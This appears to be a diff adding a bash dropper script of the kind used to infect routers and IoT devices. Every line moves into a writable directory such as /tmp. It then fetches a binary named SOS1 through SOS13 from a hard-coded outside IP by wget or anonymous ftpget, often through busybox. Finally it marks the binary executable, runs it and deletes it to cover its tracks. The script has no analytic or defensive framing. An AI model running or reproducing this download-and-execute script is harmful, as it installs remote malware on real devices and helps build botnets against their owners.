@@ -1,0 +1,53 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS1; chmod +x SOS1; ./SOS1; rm -rf SOS1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS1 SOS1; chmod +x SOS1 ./SOS1; rm -rf SOS1
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS1; /bin/busybox chmod +x SOS1; ./SOS1; /bin/busybox rm -rf SOS1
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS1 SOS1; /bin/busybox chmod +x SOS1 ./SOS1; /bin/busybox rm -rf SOS1
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS2; chmod +x SOS2; ./SOS2; rm -rf SOS2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS2 SOS2; chmod +x SOS2 ./SOS2; rm -rf SOS2
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS2; /bin/busybox chmod +x SOS2; ./SOS2; /bin/busybox rm -rf SOS2
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS2 SOS2; /bin/busybox chmod +x SOS2 ./SOS2; /bin/busybox rm -rf SOS2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS4; chmod +x SOS4; ./SOS4; rm -rf SOS4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS4 SOS4; chmod +x SOS4 ./SOS4; rm -rf SOS4
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS4; /bin/busybox chmod +x SOS4; ./SOS4; /bin/busybox rm -rf SOS4
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS4 SOS4; /bin/busybox chmod +x SOS4 ./SOS4; /bin/busybox rm -rf SOS4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS3; chmod +x SOS3; ./SOS3; rm -rf SOS3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS3 SOS3; chmod +x SOS3 ./SOS3; rm -rf SOS3
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS3; /bin/busybox chmod +x SOS3; ./SOS3; /bin/busybox rm -rf SOS3
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS3 SOS3; /bin/busybox chmod +x SOS3 ./SOS3; /bin/busybox rm -rf SOS3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS5; chmod +x SOS5; ./SOS5; rm -rf SOS5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS5 SOS5; chmod +x SOS5 ./SOS5; rm -rf SOS5
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS5; /bin/busybox chmod +x SOS5; ./SOS5; /bin/busybox rm -rf SOS5
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS5 SOS5; /bin/busybox chmod +x SOS5 ./SOS5; /bin/busybox rm -rf SOS5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS6; chmod +x SOS6; ./SOS6; rm -rf SOS6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS6 SOS6; chmod +x SOS6 ./SOS6; rm -rf SOS6
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS6; /bin/busybox chmod +x SOS6; ./SOS6; /bin/busybox rm -rf SOS6
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS6 SOS6; /bin/busybox chmod +x SOS6 ./SOS6; /bin/busybox rm -rf SOS6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS7; chmod +x SOS7; ./SOS7; rm -rf SOS7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS7 SOS7; chmod +x SOS7 ./SOS7; rm -rf SOS7
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS7; /bin/busybox chmod +x SOS7; ./SOS7; /bin/busybox rm -rf SOS7
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS7 SOS7; /bin/busybox chmod +x SOS7 ./SOS7; /bin/busybox rm -rf SOS7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS8; chmod +x SOS8; ./SOS8; rm -rf SOS8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS8 SOS8; chmod +x SOS8 ./SOS8; rm -rf SOS8
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS8; /bin/busybox chmod +x SOS8; ./SOS8; /bin/busybox rm -rf SOS8
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS8 SOS8; /bin/busybox chmod +x SOS8 ./SOS8; /bin/busybox rm -rf SOS8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS9; chmod +x SOS9; ./SOS9; rm -rf SOS9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS9 SOS9; chmod +x SOS9 ./SOS9; rm -rf SOS9
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS9; /bin/busybox chmod +x SOS9; ./SOS9; /bin/busybox rm -rf SOS9
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS9 SOS9; /bin/busybox chmod +x SOS9 ./SOS9; /bin/busybox rm -rf SOS9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS10; chmod +x SOS10; ./SOS10; rm -rf SOS10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS10 SOS10; chmod +x SOS10 ./SOS10; rm -rf SOS10
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS10; /bin/busybox chmod +x SOS10; ./SOS10; /bin/busybox rm -rf SOS10
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS10 SOS10; /bin/busybox chmod +x SOS10 ./SOS10; /bin/busybox rm -rf SOS10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS11; chmod +x SOS11; ./SOS11; rm -rf SOS11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS11 SOS11; chmod +x SOS11 ./SOS11; rm -rf SOS11
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS11; /bin/busybox chmod +x SOS11; ./SOS11; /bin/busybox rm -rf SOS11
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS11 SOS11; /bin/busybox chmod +x SOS11 ./SOS11; /bin/busybox rm -rf SOS11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS12; chmod +x SOS12; ./SOS12; rm -rf SOS12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS12 SOS12; chmod +x SOS12 ./SOS12; rm -rf SOS12
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS12; /bin/busybox chmod +x SOS12; ./SOS12; /bin/busybox rm -rf SOS12
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS12 SOS12; /bin/busybox chmod +x SOS12 ./SOS12; /bin/busybox rm -rf SOS12
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.145.131.173/SOS13; chmod +x SOS13; ./SOS13; rm -rf SOS13
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS13 SOS13; chmod +x SOS13 ./SOS13; rm -rf SOS13
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox wget http://185.145.131.173/SOS13; /bin/busybox chmod +x SOS13; ./SOS13; /bin/busybox rm -rf SOS13
+/bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; /bin/busybox ftpget -v -u anonymous -p anonymous -P 21 185.145.131.173 SOS13 SOS13; /bin/busybox chmod +x SOS13 ./SOS13; /bin/busybox rm -rf SOS13
